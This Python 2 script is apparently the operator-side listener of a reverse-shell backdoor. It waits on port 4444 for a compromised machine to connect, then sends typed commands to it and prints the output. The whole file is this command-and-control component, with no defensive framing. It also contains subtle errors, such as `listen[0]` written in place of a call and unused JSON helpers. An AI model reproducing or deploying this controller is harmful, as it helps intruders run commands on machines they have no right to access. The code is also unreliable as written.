#!/usr/bin/env python

import socket, json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        listener.bind((ip, port))
        listener.listen[0]
        # print("[+] Waiting for icoming connections")
        self.connection, address = listener.accept()
        # print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
            
    def execute_remotely(self, command):
        if command [0] == "exit":
            self.connection.close()
            exit()

        self.connection.send (command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = raw_input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("10.0.0.17", 4444)
my_listener.run()